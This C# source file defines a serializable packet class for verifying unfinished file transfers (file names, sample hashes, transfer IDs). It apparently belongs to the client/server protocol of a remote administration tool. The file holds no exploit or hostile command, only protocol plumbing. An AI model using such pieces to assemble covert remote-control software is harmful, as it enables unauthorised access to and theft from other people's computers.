using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoVerifyUnfinishedTransfers : IPacket
    {
        public string[] Files { get; set; }

        public byte[] SampleHashes { get; set; }

        public int[] TransferIDs { get; set; }

        public DoVerifyUnfinishedTransfers(string[] files, byte[] sampleHashes, int[] transferIDs)
        {
            Files = files;
            SampleHashes = sampleHashes;
            TransferIDs = transferIDs;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
